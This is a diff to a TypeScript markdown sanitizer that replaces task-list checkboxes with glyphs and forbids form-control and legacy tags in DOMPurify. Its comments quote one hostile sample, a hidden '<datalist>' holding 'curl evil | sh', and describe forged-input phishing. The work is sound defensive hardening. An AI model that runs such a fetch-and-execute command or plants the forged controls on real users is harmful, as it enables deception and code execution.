@@ -16,12 +16,64 @@
 // rather than beside the viewer — a second pipeline is the thing this file
 // exists to prevent.
 import React from 'react';
-import { marked } from 'marked';
+import { marked, Renderer } from 'marked';
+import type { Tokens } from 'marked';
 import DOMPurify from 'dompurify';
 import type { Config as SanitizeConfig } from 'dompurify';
 
 /** The "still typing" cue. A glyph, not copy — nothing here to translate. */
 export const STREAMING_CARET = '▌';
+
+/**
+ * The GFM task-list marker, as a GLYPH instead of a disabled `<input>` (#612).
+ *
+ * This exists because of the line below it: `input` is in `FORBID_TAGS`, and a
+ * task-list checkbox is the ONE thing in that whole set that markdown itself
+ * emits — `marked` renders `- [ ] todo` as
+ * `<li><input disabled="" type="checkbox"> todo</li>`. Forbidding the tag
+ * without this would have deleted the marker from every checklist in the app
+ * and left a stray leading space, which is the `align` trap one file over: a
+ * security list that silently eats a construct the parser really produces.
+ *
+ * IT IS A SUBSTITUTION, NOT A LOSS OF THE MARKER, and that is what makes
+ * forbidding the tag cost nothing on screen. `marked` writes that input
+ * `disabled`, ALWAYS — there is no markdown that produces an enabled one (its
+ * `checkbox()` renderer hard-codes it; verified against the shipped 18.0.7) —
+ * so the checkbox was never a control: it is decoration, drawn with a control.
+ * The glyph also takes the reader's THEME, which a platform checkbox does not.
+ *
+ * WHAT IT DOES COST, named rather than glossed because every other empirical
+ * claim in this file was measured and this one cannot be from here: a disabled
+ * checkbox conveys done/not-done as STATE, which a screen reader announces; a
+ * `☐` conveys it as a CHARACTER, and whether a given screen reader speaks
+ * U+2610 depends on its symbol dictionary and verbosity setting. It may say
+ * nothing. That is a real trade and it is accepted — the tag is the thing, and
+ * an unlabelled disabled checkbox was announcing state with no name attached
+ * to it either — but it wants a check with a real screen reader before anyone
+ * writes it down as an improvement. (It is also a divergence from GitHub,
+ * which renders GFM task lists as `<input type=checkbox disabled>`.)
+ *
+ * The trailing space is `marked`'s own — its default `checkbox()` emits
+ * `<input …> ` and the item text follows, so dropping it would run the marker
+ * into the first word.
+ *
+ * NOT `aria-hidden` and NOT a `<span class>`, for two different reasons.
+ * `SANITIZE_CONFIG` runs AFTER this and `ALLOW_ARIA_ATTR: false` strips the
+ * first. It does NOT strip the second — DOMPurify keeps `class` and no config
+ * flag filters by prefix, which this file says 100 lines down — but a `doc-`
+ * or `feed-` prefixed one would be taken by `stripDecorationNamespace`, which
+ * runs before each surface decorates, and an un-namespaced one would survive
+ * into a stylesheet that has no rule for it. A bare glyph needs neither, and
+ * has nothing for content to forge that it could not forge by typing the
+ * character.
+ */
+export const TASK_GLYPH = { checked: '☑', unchecked: '☐' } as const;
+
+class TaskListGlyphRenderer extends Renderer {
+  override checkbox({ checked }: Tokens.Checkbox): string {
+    return `${checked ? TASK_GLYPH.checked : TASK_GLYPH.unchecked} `;
+  }
+}
 
 /**
  * The ONE parser configuration.
@@ -37,8 +89,44 @@ export const STREAMING_CARET = '▌';
  *    naming it makes it a decision rather than an inheritance.
  *  - `breaks: false` — a single newline is not a `<br>`. GFM's own rule, and
  *    the one that keeps a hard-wrapped paragraph from rendering as a ladder.
+ *  - `renderer` — `marked`'s own, with ONE method replaced: the task-list
+ *    checkbox (#612, see `TaskListGlyphRenderer`). It is an instance rather
+ *    than `marked.use({ renderer })` deliberately: `use` mutates the library's
+ *    GLOBAL defaults, which would make this module's configuration reach code
+ *    that never imported it — the opposite of the thesis this file is built on.
+ *    Passing the instance per parse keeps the change scoped to this call, and
+ *    it must be an instance and not an object literal: `marked` 18 takes an
+ *    options `renderer` as the WHOLE renderer, so a literal with one method on
+ *    it throws `this.renderer.<token> is not a function` on the first token.
+ *
+ *    ONE INSTANCE, SHARED BY EVERY PARSE, and that is safe for a reason worth
+ *    knowing before someone reaches for `async: true`: `marked`'s `Parser`
+ *    WRITES to the renderer you hand it (`renderer.options`, `renderer.parser`)
+ *    on every parse. With `async: false` every parse runs to completion
+ *    synchronously, so no two can interleave. An async parse would cross that
+ *    state between documents. It is also why the instance itself is NOT frozen
+ *    below — freezing it makes `marked` throw on the first parse.
  */
-export const MARKED_OPTIONS = { async: false, gfm: true, breaks: false } as const;
+export const MARKED_OPTIONS = {
+  async: false,
+  gfm: true,
+  breaks: false,
+  renderer: new TaskListGlyphRenderer(),
+} as const;
+
+// FROZEN for `SANITIZE_CONFIG`'s reason, which reached this constant when #612
+// put POLICY in it. It used to be three booleans; it now carries the renderer
+// that is the sole reason `input` can be in `FORBID_TAGS`, so
+// `MARKED_OPTIONS.renderer = new Renderer()` from anywhere in the renderer
+// process would put the disabled `<input>` back — into a pipeline that then
+// deletes it, silently eating every checklist marker in the app.
+//
+// SHALLOW, and deliberately: the renderer instance cannot be frozen (see
+// above). What this closes is the swap, not the method — one of the two, and
+// the one a stray line is likely to be. Safe to freeze at all because `marked`
+// copies options into a fresh object per parse rather than writing to ours;
+// verified against the shipped 18.0.7.
+Object.freeze(MARKED_OPTIONS);
 
 /**
  * The ONE sanitizer configuration. §5.29 in a constant. ONE — see the `style`
@@ -245,13 +333,10 @@ export const MARKED_OPTIONS = { async: false, gfm: true, breaks: false } as cons
  * is gone.
  *
  * NOT "every tab stop in a rendered surface is ours", and the difference is
- * worth the sentence: `<button>`, `<input>`, `<select>` and `<textarea>` are in
+ * worth the sentence: `<button>`, `<input>`, `<select>` and `<textarea>` WERE in
  * DOMPurify's TAG allow-list, and a native control is focusable without any
- * `tabindex` at all, so a forged `<button>` in a reply is still a tab stop. That
- * is known and bounded rather than new — `FeedView.forgery.test.tsx` says so in
- * its header and pins the behaviour — and closing it is a `FORBID_TAGS`
- * decision, the same one `<center>`/`<marquee>` need. This item did not take
- * it.
+ * `tabindex` at all, so a forged `<button>` in a reply WAS still a tab stop.
+ * That is the SIXTH block, and #612 took it.
  *
  * MARKDOWN EMITS NONE OF THEM, and the one attribute that looks adjacent is
  * why `align` is deliberately NOT on this list: GFM table alignment renders as
@@ -273,16 +358,125 @@ export const MARKED_OPTIONS = { async: false, gfm: true, breaks: false } as cons
  * tabindex", a review discussing a "no-JS popover approach"). Bare on a tag:
  * zero, for every one of them.
  *
- * THE TAGS ARE LEFT, deliberately, and this is the honest edge of the change:
- * `<center>` and `<marquee>` are still allowed, `<font>` still renders (as a
- * bare inline box now that its attributes are gone), and the native focusables
- * above are still focusable. Alignment, motion and "content owns a widget" are a
- * different question from identity, theme and the clipboard; they need a
- * `FORBID_TAGS` decision with a measurement of its own, and this item did not
- * take one. The pure LAYOUT attributes are left for the same reason and are
- * weaker still: `border`, `cellpadding`, `cellspacing`, `valign`, `nowrap`,
- * `noshade`, `clear`, `width` and `height` all survive. They size and space a
- * box; none of them hides content, repaints it, or speaks to a screen reader,
+ * `FORBID_TAGS` closes the SIXTH, and it is the first block on this list that
+ * is about ELEMENTS rather than attributes (#612). Seven tags in two groups,
+ * and they are one decision only in the sense that they are one mechanism:
+ *
+ * `button`, `input`, `select`, `textarea` — THE NATIVE FOCUSABLES, and the
+ * reason the `tabindex` paragraph above could not claim what it wanted to. A
+ * native control is focusable with NO `tabindex` at all, so stripping the
+ * attribute never touched them: a forged `<button>` in a reply was still a tab
+ * stop, wearing a label it chose. #465's audit of the feed found that shape and
+ * bounded it ("UI redress on the keyboard path, not script execution"); what it
+ * could not do was close it, because the tag is the thing.
+ *
+ * A TEXT BOX IS WORSE THAN A BUTTON, and it is what settles `input` and
+ * `textarea` rather than the focus argument alone: a reply can draw an entry
+ * field, and the reader has no way to tell a field the app drew from a field a
+ * reply drew — the DOM does not remember who wrote an element any more than it
+ * remembers who wrote an attribute (#465's sentence, one layer up). "Paste your
+ * token to continue" under a text box, inside a conversation the user is
+ * already typing into, is a phishing surface the app hosts on the attacker's
+ * behalf.
+ *
+ * WHAT IT IS NOT, checked rather than assumed, because the obvious next step is
+ * to claim exfiltration and the claim would be FALSE HERE: `<form>` is in the
+ * html profile, `action` and `method` survive it, and the sanitizer really did
+ * return `<form action="https://…"><input name="token">` intact (verified
+ * against the shipped DOMPurify 3.4.12 with this exact config). But this app
+ * names `form-action 'none'` in BOTH policies — `shared/csp.ts`, and
+ * `markdown.test.tsx` already pins it with the sentence "recorded here rather
+ * than papered over with a FORBID_TAGS entry". So nothing submits, with or
+ * without these tags, and the harm this line closes is DECEPTION, not
+ * transmission. `<form>` itself therefore stays allowed, exactly as that test
+ * decided: with nothing to type into and nothing to submit with, it is a `<div>`
+ * with a URL attached.
+ *
+ * `option`, `optgroup`, `datalist`, `rp` — THE REST OF THE FAMILY, added in
+ * review, and they are on this list for #608's lesson rather than for a new
+ * argument of their own: that item closed `hidden` and had to be told that
+ * `popover` was the same attack one attribute over. These are the same shape one
+ * TAG over.
+ *
+ *  - `datalist` IS `hidden` RESPELLED. The HTML rendering spec gives it
+ *    `display: none`, DOMPurify allows it, and `KEEP_CONTENT` keeps its
+ *    children — so `<datalist><pre>curl evil | sh</pre></datalist>` is a `<pre>`
+ *    that is in the document, in the DOM and in a find, and not on the screen.
+ *    That is #598's own stated harm for `<p hidden>`, and it arrived on the
+ *    data source of the dropdown this item was already removing.
+ *  - `option` and `optgroup` FINISH `select`. Forbidding the parent alone
+ *    hoisted them out as orphaned elements rather than as text, which made
+ *    "the element goes, its children stay" true only in the loosest sense.
+ *  - `rp` IS THE LAST UA-HIDDEN TAG IN THE PROFILE: `ruby > rp` is
+ *    `display: none`, so `<ruby>x<rp>hidden</rp></ruby>` is `datalist` again in
+ *    miniature. `ruby` and `rt` STAY — they show what they contain, and taking
+ *    a whole typographic feature to close its parenthesis fallback would be the
+ *    over-reach this list is trying not to be.
+ *
+ * `center`, `marquee`, `font` — THE LEGACY TAGS, and this is the smaller half.
+ * `<center>` aligns a block the theme did not, `<marquee>` moves content the
+ * user did not ask to move (an animation with no `prefers-reduced-motion`
+ * respect, because there is no CSS of ours for the media query to reach), and
+ * `<font>` has been a bare inline box since #466/#598 took its attributes — an
+ * element that now renders nothing at all, kept only by the profile's inertia.
+ * None of them is a security hole. They go because they are the same question
+ * asked of tags — content dictating presentation — and because the measurement
+ * says they cost nothing.
+ *
+ * NOTHING LEGITIMATE IS LOST, and here that claim needed WORK rather than only
+ * a measurement, because ONE of the eleven is emitted by markdown itself.
+ * `marked` renders a GFM task list as `<li><input disabled="" type="checkbox">`,
+ * so forbidding `input` and stopping there would have deleted the marker from
+ * every checklist in the app — `align`'s trap, and the corpus says checklists
+ * are the ONE construct here that real assistant prose actually writes
+ * (9 task-list items, all of them bare in prose, versus zero bare uses of any
+ * of the eleven tags). `MARKED_OPTIONS`' renderer draws that marker as a glyph
+ * instead, ABOVE this comment and before the sanitizer ever sees it, so the
+ * checklist keeps its box and the tag can go. That is the difference from
+ * `align`, which had no such move available and therefore stayed.
+ *
+ * Measured the way #436 measured `style`, #509 measured ARIA and #466/#598
+ * measured the presentational set, on the same machine's corpus (2026-08-20):
+ * 7,590 captured transcripts, 18,386 assistant text blocks, 10.2 MB of prose —
+ * `<font` 7, `<center` 5, `<marquee` 3, `<button` 35, `<input` 21, `<select` 2,
+ * `<textarea` 6, `<datalist` 4, `<option` 2, `<optgroup` 1, `<rp` 2. EVERY ONE
+ * of the 88 was inside a code fence or a code span, where `marked` escapes it to
+ * text and the sanitizer never sees an element. BARE IN PROSE — the only form
+ * that reaches DOMPurify as markup — zero, for every one of the eleven. (A tag
+ * measurement asks a different question from an attribute one: the pattern IS
+ * the element, so "on a tag" is true by construction and what decides the case
+ * is fence/span versus bare.)
+ *
+ * THE CONTENT SURVIVES, THE ELEMENT DOES NOT. DOMPurify's `KEEP_CONTENT`
+ * default is `true` and none of these eleven is in `FORBID_CONTENTS`, so
+ * `<button>Approve</button>` renders as the word *Approve* and
+ * `<center><h2>Title</h2></center>` keeps its heading. The reader still sees
+ * everything the reply said — the property `FeedView.forgery.test.tsx` calls
+ * "strips the attributes, not the message", now true of elements too.
+ *
+ * WHAT IS STILL FOCUSABLE IN RENDERED CONTENT, said plainly because the
+ * `tabindex` block above got burned on exactly this: `<a href>` is a tab stop
+ * and ORDINARY MARKDOWN EMITS ONE for every link, `<summary>` is a tab stop and
+ * `<details><summary>` is a collapsible section real agents write by hand,
+ * `<audio controls>` / `<video controls>` are focusable media, and `<area
+ * href>` inside a `<map>` is the exhaustive-list footnote (unreachable in
+ * practice: every `<img>` becomes a chip in the viewer, and CSP `'self'` stops a
+ * remote one rendering at all). The viewer replaces media with a "media not
+ * shown" chip; THE FEED HAS NO SUCH PASS, so a `<video controls>` in a reply is
+ * a stop that is not a link, not a disclosure and not ours.
+ *
+ * So "the conversation is ONE tab stop" (#174) is a statement about the app's
+ * own CHROME, and it cannot be made true of content by any tag list that still
+ * renders links. What #612 closes is narrower and is what the sentence should
+ * say: CONTENT CANNOT PLANT A CONTROL — no button, no text box, no dropdown.
+ * NOT "every stop is a link or ours": that sentence was written here first and
+ * review struck it out, because the media two paragraphs up already disprove
+ * it. The honest form is the one with the list of exceptions attached.
+ *
+ * THE PURE LAYOUT ATTRIBUTES ARE STILL LEFT, and are weaker than any of the
+ * above: `border`, `cellpadding`, `cellspacing`, `valign`, `nowrap`, `noshade`,
+ * `clear`, `width` and `height` all survive. They size and space a box; none of
+ * them hides content, repaints it, speaks to a screen reader, or takes focus,
  * which is where this file draws the line.
  *
  * Everything else is DOMPurify's default and deliberately so: its allow-list,
@@ -319,6 +513,29 @@ export const SANITIZE_CONFIG: SanitizeConfig = {
     'inert',
     'tabindex',
   ],
+  // The tag half (#612). Same shape as `FORBID_ATTR` and for the same reason:
+  // all seven are ordinary members of the html profile's TAG allow-list, so no
+  // flag reaches them and each has to be named. `KEEP_CONTENT` is left at its
+  // default `true`, which is the half that makes this safe to do at all —
+  // the element goes, its children stay.
+  //
+  // `input` is the one markdown emits, and it is only safe to name here
+  // because `MARKED_OPTIONS`' renderer draws the task-list checkbox as a glyph
+  // before this runs. Delete that renderer and this line starts eating
+  // checklists — see the comment above, and the test that pins it.
+  FORBID_TAGS: [
+    'button',
+    'input',
+    'select',
+    'option',
+    'optgroup',
+    'datalist',
+    'textarea',
+    'center',
+    'marquee',
+    'font',
+    'rp',
+  ],
   ALLOW_DATA_ATTR: false,
   ALLOW_ARIA_ATTR: false,
 };
@@ -327,16 +544,17 @@ export const SANITIZE_CONFIG: SanitizeConfig = {
 // exported mutable object is a second one waiting to be written at runtime:
 // `SANITIZE_CONFIG.FORBID_ATTR.pop()` from anywhere in the renderer would
 // re-open the hole for every surface at once, silently, with the source still
-// reading exactly as it does here. The nested array and profile object are
-// frozen too — freezing only the top level leaves the array mutable, which is
+// reading exactly as it does here. BOTH nested arrays and the profile object
+// are frozen too — freezing only the top level leaves them mutable, which is
 // where the policy actually lives.
 //
 // Frozen as statements rather than by wrapping the literal in `Object.freeze`
-// so the declared type stays `SanitizeConfig`: DOMPurify's `FORBID_ATTR` is
-// `string[]`, and a frozen literal infers `readonly string[]`, which would need
-// a cast to assign. Runtime immutability, no cast.
+// so the declared type stays `SanitizeConfig`: DOMPurify's `FORBID_ATTR` and
+// `FORBID_TAGS` are `string[]`, and a frozen literal infers `readonly string[]`,
+// which would need a cast to assign. Runtime immutability, no cast.
 Object.freeze(SANITIZE_CONFIG);
 Object.freeze(SANITIZE_CONFIG.FORBID_ATTR);
+Object.freeze(SANITIZE_CONFIG.FORBID_TAGS);
 Object.freeze(SANITIZE_CONFIG.USE_PROFILES);
 
 /**
